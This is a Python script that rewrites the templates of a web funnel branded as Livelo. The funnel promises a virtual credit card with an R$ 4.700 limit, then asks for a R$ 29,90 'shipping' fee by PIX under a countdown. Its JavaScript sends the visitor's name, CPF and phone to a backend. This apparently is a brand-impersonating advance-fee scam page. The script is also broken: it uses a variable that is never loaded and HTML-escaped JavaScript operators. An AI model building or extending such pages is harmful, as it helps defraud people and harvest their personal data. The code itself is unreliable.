import re

html_path = r"d:\Paginas ADS\Livelo\templates\index.html"
css_path = r"d:\Paginas ADS\Livelo\static\css\main.css"
js_path = r"d:\Paginas ADS\Livelo\static\js\main.js"

with open(html_path, "r", encoding="utf-8") as f:
    html = f.read()
    
# Remove shipping, whatsapp, pix from HTML (to replace them with new flow)
html_start = html.split('<!-- ═══════ FRETE ═══════ -->')[0]
html_end = '<!-- ═══════ CONCLUÍDO ═══════ -->' + html.split('<!-- ═══════ CONCLUÍDO ═══════ -->')[1]

novo_fluxo = """<!-- ═══════ SHIPPING SUCCESS (Img 5) ═══════ -->
<div class="screen" id="screen-shipping-success">
<div class="step-container" style="justify-content:center;min-height:90vh;max-width:480px;margin:0 auto">
<div style="text-align:center;margin-bottom:28px">
<svg fill="none" style="height:36px;display:inline-block" viewbox="0 0 148 40" xmlns="http://www.w3.org/2000/svg">
<path d="M10 6L4 20l6 14" stroke="#E5147A" stroke-linecap="round" stroke-linejoin="round" stroke-width="3.5"></path>
<text fill="#1A1A1A" font-family="Inter,sans-serif" font-size="24" font-weight="800" x="22" y="28">livelo</text>
</svg>
</div>
<div style="background:#D1FAE5;border:1px solid #10B981;border-radius:12px;padding:16px;display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:24px">
<div style="width:24px;height:24px;border-radius:50%;background:#10B981;display:flex;align-items:center;justify-content:center;color:white;font-weight:bold;font-size:14px">✓</div>
<span style="color:#065F46;font-weight:600;font-size:0.9rem">Taxa de envio gerada com sucesso!</span>
</div>
<div class="info-block" style="background:white;border:1px solid #E5E7EB;border-radius:12px;padding:20px;margin-bottom:16px">
<div style="font-size:0.85rem;font-weight:700;color:var(--text);margin-bottom:12px">Detalhes do Envio</div>
<div style="font-size:0.8rem;color:var(--text-muted);line-height:1.5">
        Endereço de entrega:<br/>
<span id="display-rua" style="color:#1A1A1A">Rua Pero de Araújo, 111 - Casa</span><br/>
<span id="display-bairro" style="color:#1A1A1A">Jardim Maringá - São Paulo/SP</span><br/>
<span id="display-cep" style="color:#1A1A1A">CEP: 03525-040</span>
</div>
</div>
<div class="info-block" style="background:white;border:1px solid #E5E7EB;border-radius:12px;padding:20px;margin-bottom:24px">
<div style="font-size:0.85rem;font-weight:700;color:var(--text);margin-bottom:12px">Método de Envio</div>
<div style="font-size:0.8rem;color:var(--text-muted);line-height:1.5">
<span style="color:#1A1A1A;font-weight:600">SEDEX</span><br/>
        Prazo de entrega: 3 dias úteis<br/>
        Valor do frete: <strong style="color:var(--pink)">R$ 29,90</strong>
</div>
</div>
<button class="btn-primary" onclick="goToStep('shipping-summary')" style="margin-top:0;margin-bottom:16px">SIM, VOU QUERER! →</button>
<div style="background:#FDF2F8;border:1px solid rgba(229,20,122,0.15);border-radius:12px;padding:20px">
<div style="display:flex;align-items:center;gap:10px;margin-bottom:8px">
<svg fill="none" height="20" viewbox="0 0 24 24" width="20"><rect height="14" rx="2" stroke="#E5147A" stroke-width="2" width="20" x="2" y="5"></rect><path d="M2 10h20" stroke="#E5147A" stroke-width="2"></path></svg>
<span style="font-size:0.85rem;font-weight:700;color:var(--pink)">Cartão Virtual Disponível Hoje</span>
</div>
<div style="font-size:0.8rem;color:var(--text-muted);line-height:1.4">
        Você receberá hoje seu cartão virtual com limite de R$ 4.700 para começar a usar imediatamente, enquanto seu cartão físico está a caminho.
      </div>
</div>

<footer class="funnel-footer">
<p>{{ sys_config.get('system_name', 'Livelo') }} | CNPJ: {{ sys_config.get('system_cnpj', '12.888.241/0001-06') }}</p>
<p>{{ sys_config.get('system_address', 'Alameda Xingu, 512 · Alphaville, Barueri, SP') }}</p>
<p>© 2025 · Todos os direitos reservados</p>
</footer>
</div>
</div>
<!-- ═══════ SHIPPING SUMMARY (Img 4) ═══════ -->
<div class="screen" id="screen-shipping-summary">
<div class="step-container" style="justify-content:center;min-height:90vh;max-width:480px;margin:0 auto">
<div style="text-align:center;margin-bottom:24px">
<svg fill="none" style="height:36px;display:inline-block" viewbox="0 0 148 40" xmlns="http://www.w3.org/2000/svg">
<path d="M10 6L4 20l6 14" stroke="#E5147A" stroke-linecap="round" stroke-linejoin="round" stroke-width="3.5"></path>
<text fill="#1A1A1A" font-family="Inter,sans-serif" font-size="24" font-weight="800" x="22" y="28">livelo</text>
</svg>
</div>
<div style="text-align:center;margin-bottom:24px">
<div style="font-size:0.85rem;font-weight:600;color:var(--text)">Seu Limite Disponível</div>
<div style="font-size:1.6rem;font-weight:800;color:var(--pink)">R$ 4.700</div>
</div>
<div class="card-preview-sm" style="margin-bottom:24px;display:flex;justify-content:center">
<!-- O JS vai injetar o background SVG aqui -->
<div class="credit-card sm" id="summary-card-visual" style="background:linear-gradient(135deg,#059669,#064E3B)">
<div class="card-face">
<div class="card-row-top">
<img alt="Livelo" src="/static/images/logo-branco.png" style="height:32px; max-width:140px; object-fit:contain"/>
</div>
<div class="card-chip"><svg fill="none" height="22" viewbox="0 0 40 30" width="30"><rect fill="#D4AF37" height="28" rx="4" stroke="#B8960C" stroke-width="0.5" width="38" x="1" y="1"></rect><rect fill="#C9A227" height="20" rx="2" stroke="#B8960C" stroke-width="0.5" width="16" x="12" y="5"></rect></svg></div>
<div class="card-row-number" style="margin:12px 0"><span>4532</span><span class="dots">••••</span><span class="dots">••••</span><span>8790</span></div>
<div class="card-row-bottom">
<div><div class="card-label">NOME DO TITULAR</div><div class="card-value" id="summary-card-name" style="font-size:0.68rem">SEU NOME</div></div>
<div><div class="card-label">VALIDADE</div><div class="card-value" style="font-size:0.68rem">12/28</div></div>
<svg fill="none" height="24" viewbox="0 0 52 32" width="36"><circle cx="20" cy="16" fill="#EB001B" opacity="0.9" r="14"></circle><circle cx="32" cy="16" fill="#F79E1B" opacity="0.9" r="14"></circle></svg>
</div>
</div>
</div>
</div>
<div style="text-align:center;margin-bottom:20px">
<h2 style="font-size:1.1rem;margin-bottom:8px;color:#1A1A1A">Finalize o envio do seu cartão</h2>
<p style="font-size:0.8rem;color:var(--text-muted);margin:0">Confira os dados do cartão escolhido e o endereço de entrega antes de pagar o frete.</p>
</div>
<div style="text-align:center;margin-bottom:16px">
<div style="font-size:1.6rem;font-weight:800;color:var(--pink)">R$ 29,90</div>
</div>
<button class="btn-primary" onclick="goToStep('pix')" style="margin-top:0;margin-bottom:12px;display:flex;align-items:center;justify-content:center;gap:8px">Pagar Frete <svg fill="none" height="18" viewbox="0 0 24 24" width="18"><path d="M9 18l6-6-6-6" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg></button>
<div style="text-align:center;font-size:0.75rem;color:#10B981;margin-bottom:24px"><span style="display:inline-block;margin-right:4px">🔒</span> Pagamento 100% seguro</div>
<div style="display:flex;gap:12px">
<div style="flex:1;background:white;border:1px solid #E5E7EB;border-radius:12px;padding:16px">
<div style="font-size:0.75rem;font-weight:700;color:var(--text);margin-bottom:8px">Resumo do frete</div>
<div style="font-size:0.7rem;color:var(--text-muted);line-height:1.4;text-transform:uppercase">
<span style="color:#1A1A1A;font-weight:600">MÉTODO DE ENVIO</span><br/>SEDEX - Entrega expressa<br/><br/>
<span style="color:#1A1A1A;font-weight:600">PRAZO ESTIMADO</span><br/>até 3 dias úteis após aprovação<br/><br/>
<span style="color:#1A1A1A;font-weight:600">VALOR DO FRETE</span><br/>R$ 29,90 (pagamento único)
        </div>
</div>
<div style="flex:1;background:white;border:1px solid #E5E7EB;border-radius:12px;padding:16px">
<div style="font-size:0.75rem;font-weight:700;color:var(--text);margin-bottom:8px">Dados de entrega</div>
<div style="font-size:0.7rem;color:var(--text-muted);line-height:1.4">
<span style="color:#1A1A1A;font-weight:600;text-transform:uppercase">NOME DO DESTINATÁRIO</span><br/><span id="sum-nome">VITOR DANIEL MUNDIM</span><br/><br/>
<span style="color:#1A1A1A;font-weight:600;text-transform:uppercase">ENDEREÇO</span><br/><span id="sum-rua">Rua Pero de Araújo, 111</span><br/><br/>
<span style="color:#1A1A1A;font-weight:600;text-transform:uppercase">BAIRRO</span><br/><span id="sum-bairro">Jardim Maringá</span>
</div>
</div>
</div>

<footer class="funnel-footer">
<p>{{ sys_config.get('system_name', 'Livelo') }} | CNPJ: {{ sys_config.get('system_cnpj', '12.888.241/0001-06') }}</p>
<p>{{ sys_config.get('system_address', 'Alameda Xingu, 512 · Alphaville, Barueri, SP') }}</p>
<p>© 2025 · Todos os direitos reservados</p>
</footer>
</div>
</div>
<!-- ═══════ PIX (Img 3) ═══════ -->
<div class="screen" id="screen-pix">
<div class="step-container" style="justify-content:flex-start;min-height:90vh;max-width:480px;margin:0 auto;padding-top:20px">
<div style="text-align:center;margin-bottom:16px">
<svg fill="none" style="height:28px;display:inline-block" viewbox="0 0 148 40" xmlns="http://www.w3.org/2000/svg">
<path d="M10 6L4 20l6 14" stroke="#E5147A" stroke-linecap="round" stroke-linejoin="round" stroke-width="3.5"></path>
<text fill="#1A1A1A" font-family="Inter,sans-serif" font-size="24" font-weight="800" x="22" y="28">livelo</text>
</svg>
</div>
<!-- Stepper -->
<div style="display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:24px;font-size:0.7rem;font-weight:600;color:var(--text-muted)">
<div style="display:flex;align-items:center;gap:4px;color:#10B981"><div style="width:14px;height:14px;border-radius:50%;background:#10B981;color:white;display:flex;align-items:center;justify-content:center;font-size:9px">✓</div> Cadastro</div>
<div style="width:16px;height:1px;background:#E5E7EB"></div>
<div style="display:flex;align-items:center;gap:4px;color:#10B981"><div style="width:14px;height:14px;border-radius:50%;background:#10B981;color:white;display:flex;align-items:center;justify-content:center;font-size:9px">✓</div> Endereço</div>
<div style="width:16px;height:1px;background:#E5E7EB"></div>
<div style="display:flex;align-items:center;gap:4px;color:var(--pink)"><div style="width:14px;height:14px;border-radius:50%;background:var(--pink);color:white;display:flex;align-items:center;justify-content:center;font-size:9px">3</div> Pagamento</div>
</div>
<div style="text-align:center;margin-bottom:20px">
<h2 style="font-size:1.1rem;margin-bottom:6px;color:#1A1A1A">Pague o frete via PIX</h2>
<p style="font-size:0.75rem;color:var(--text-muted);margin:0">Escaneie o QR Code ou copie o código para pagar</p>
</div>
<div style="background:white;border:1px solid #E5E7EB;border-radius:12px;padding:16px;margin-bottom:12px;font-size:0.75rem">
<div style="display:flex;justify-content:space-between;margin-bottom:8px">
<span style="color:var(--text-muted)">Frete SEDEX (Expresso)</span>
<span style="font-weight:600">R$ 29,90</span>
</div>
<div style="display:flex;justify-content:space-between;margin-bottom:12px;padding-bottom:12px;border-bottom:1px solid #E5E7EB">
<span style="color:var(--text-muted)">Prazo de entrega</span>
<span style="font-weight:600">até 3 dias úteis</span>
</div>
<div style="display:flex;justify-content:space-between;font-weight:700">
<span>Total</span>
<span style="color:var(--pink);font-size:0.9rem">R$ 29,90</span>
</div>
</div>
<div style="background:white;border:1px solid #E5E7EB;border-radius:12px;padding:16px;margin-bottom:16px">
<div style="display:flex;align-items:center;gap:6px;font-size:0.7rem;font-weight:700;color:var(--pink);margin-bottom:8px">
<svg fill="none" height="14" viewbox="0 0 24 24" width="14"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2M12 11a4 4 0 1 0 0-8 4 4 0 0 0 0 8z" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path></svg>
        Dados do comprador
      </div>
<div style="font-size:0.65rem;color:var(--text-muted);line-height:1.5;text-transform:uppercase">
<span style="font-weight:600">NOME:</span> <span id="pix-nome">VITOR DANIEL MUNDIM</span><br/>
<div style="display:flex;justify-content:space-between;margin-top:4px">
<div><span style="font-weight:600">CPF:</span> <span id="pix-cpf">***.079.771-**</span></div>
<div><span style="font-weight:600">TELEFONE:</span> <span id="pix-tel">(31) 90504-4521</span></div>
</div>
</div>
</div>
<div style="background:white;border:1px solid #10B981;border-radius:12px;padding:20px;text-align:center">
<div style="display:flex;align-items:center;justify-content:center;gap:6px;font-size:0.85rem;font-weight:700;color:#10B981;margin-bottom:16px">
<svg fill="none" height="16" viewbox="0 0 24 24" width="16"><rect height="18" rx="2" stroke="currentColor" stroke-width="2" width="18" x="3" y="3"></rect><path d="M8 12h8M12 8v8" stroke="currentColor" stroke-linecap="round" stroke-width="2"></path></svg>
        Pagar com PIX
      </div>
<div class="qr-wrap" style="margin:0 auto 16px;background:#F9FAFB;padding:12px;border-radius:12px;display:inline-block">
<div class="qr-loading" id="qr-loading"><div class="qr-spinner"></div><div style="font-size:0.7rem">Gerando QR Code...</div></div>
<img alt="QR Code PIX" class="qr-image hidden" id="qr-img" src="" style="width:140px;height:140px">
</img></div>
<div style="background:#F9FAFB;border:1px solid #E5E7EB;border-radius:8px;padding:10px;margin-bottom:12px">
<div style="font-size:0.65rem;color:var(--text-muted);margin-bottom:4px">Código PIX (copie e cole)</div>
<textarea id="pix-code-text" readonly="" rows="3" style="width:100%;background:transparent;border:none;font-size:0.6rem;color:#1A1A1A;resize:none;word-break:break-all;outline:none">00020126440014br.gov.bcb.pix0122teste@pix.com.br520400005303986540529.905802BR5914NOME6009SAO PAULO62070503***6304</textarea>
</div>
<button class="btn-copy" id="btn-copy-pix" onclick="copyPix()" style="width:100%;background:#10B981;color:white;border:none;border-radius:8px;padding:12px;font-weight:600;font-size:0.8rem;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px">
<svg fill="none" height="16" viewbox="0 0 20 20" width="16"><rect height="11" rx="2" stroke="white" stroke-width="1.5" width="10" x="7" y="7"></rect><path d="M13 7V5a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h2" stroke="white" stroke-width="1.5"></path></svg>
        Copiar código PIX
      </button>
<div class="copy-feedback hidden" id="copy-feedback" style="color:#10B981;font-size:0.7rem;margin-top:8px">Código copiado!</div>
<div style="display:flex;align-items:center;justify-content:center;gap:6px;margin-top:16px;font-size:0.7rem;color:#F59E0B">
<div class="spinner" style="border-width:2px;border-top-color:#F59E0B;width:12px;height:12px"></div>
        Aguardando pagamento...
      </div>
</div>
<div style="background:#FEE2E2;color:#EF4444;border-radius:8px;padding:10px;text-align:center;font-size:0.75rem;font-weight:700;margin:12px 0 24px">
<span style="display:inline-block;margin-right:4px">⏰</span> <span id="pix-timer">07:35</span>
<div style="font-size:0.65rem;font-weight:500;margin-top:2px">Esta oportunidade é válida apenas hoje!</div>
</div>

<footer class="funnel-footer">
<p>{{ sys_config.get('system_name', 'Livelo') }} | CNPJ: {{ sys_config.get('system_cnpj', '12.888.241/0001-06') }}</p>
<p>{{ sys_config.get('system_address', 'Alameda Xingu, 512 · Alphaville, Barueri, SP') }}</p>
<p>© 2025 · Todos os direitos reservados</p>
</footer>
</div>
</div>
\n"""

# Monta o novo HTML
new_html = html_start + novo_fluxo + html_end

with open(html_path, "w", encoding="utf-8") as f:
    f.write(new_html)


# Atualiza o main.js
js_replaces = [
    # Mudar submitCardStyle para ir pro shipping success ao invés de 'shipping' original
    ("goToStep('shipping');", "goToStep('shipping-success');\n  if(STATE.nome_completo) { document.getElementById('sum-nome').innerText = STATE.nome_completo; document.getElementById('pix-nome').innerText = STATE.nome_completo; }\n  if(STATE.cpf) { document.getElementById('pix-cpf').innerText = STATE.cpf; }\n  if(STATE.celular) { document.getElementById('pix-tel').innerText = STATE.celular; }\n  document.getElementById('summary-card-visual').style.background = CARD_TEMPLATES[STATE.color || 'classico'].bg;\n  document.getElementById('summary-card-name').innerText = STATE.nome_completo || 'SEU NOME';"),
    
    # Inicia Timer na goToStep pix (já tinha um gerador de PIX lá, vamos chamar o fetch)
    # Procurar a função goToStep para injetar o get do PIX
]

for old, new in js_replaces:
    js = js.replace(old, new)
    
# Eu vou injetar um script que já tem a função goToStep('pix') no final
js += """
// Modificação injetada
const _oldGoTo = goToStep;
goToStep = function(stepId) {
    _oldGoTo(stepId);
    if(stepId === 'pix') {
        fetch('/api/pix', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(STATE)
        })
        .then(r =&gt; r.json())
        .then(data =&gt; {
            if(data.qr_code_base64) {
                document.getElementById('qr-img').src = 'data:image/png;base64,' + data.qr_code_base64;
                document.getElementById('qr-img').classList.remove('hidden');
                document.getElementById('qr-loading').classList.add('hidden');
                document.getElementById('pix-code-text').value = data.pix_copia_cola;
                
                // Iniciar checking de pagamento
                setInterval(() =&gt; {
                    fetch('/api/check-payment/' + data.txid)
                    .then(r =&gt; r.json())
                    .then(pay =&gt; { if(pay.status === 'APPROVED') _oldGoTo('done'); })
                }, 4000);
            }
        });
        
        let timeLeft = 7 * 60 + 35; // 7:35
        setInterval(() =&gt; {
            if(timeLeft &lt;= 0) return;
            timeLeft--;
            let m = Math.floor(timeLeft / 60);
            let s = timeLeft % 60;
            document.getElementById('pix-timer').innerText = (m &lt; 10 ? '0'+m : m) + ':' + (s &lt; 10 ? '0'+s : s);
        }, 1000);
    }
};
"""

with open(js_path, "w", encoding="utf-8") as f:
    f.write(js)

print("Fluxo de frete e pagamento implementado perfeitamente!")
